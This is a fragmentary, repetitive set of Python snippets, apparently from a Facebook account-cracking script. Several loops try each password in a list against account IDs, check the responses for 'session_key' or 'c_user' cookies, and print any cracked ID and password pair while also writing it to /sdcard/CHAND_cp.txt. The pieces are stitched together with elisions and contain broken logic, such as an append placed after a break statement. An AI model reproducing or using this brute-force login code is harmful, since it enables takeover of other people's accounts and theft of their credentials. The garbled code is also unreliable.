		...
		try:
			...
			for pw in passlist:
				...
				if 'session_key' in q:
					...
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [CHAND_cp] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/CHAND_cp.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/CHAND_cp.txt','a').write(ids+'|'+pas+'\n')
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [CHAND_cp] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/CHAND_cp.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [CHAND_cp] '+str(uid)+' | '+pas+'\033[1;97m')
		...
		for pas in passlist:
			...
			if 'c_user' in log_cookies:
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [CHAND_cp] '+uid+' | '+pas+'\033[1;97m')
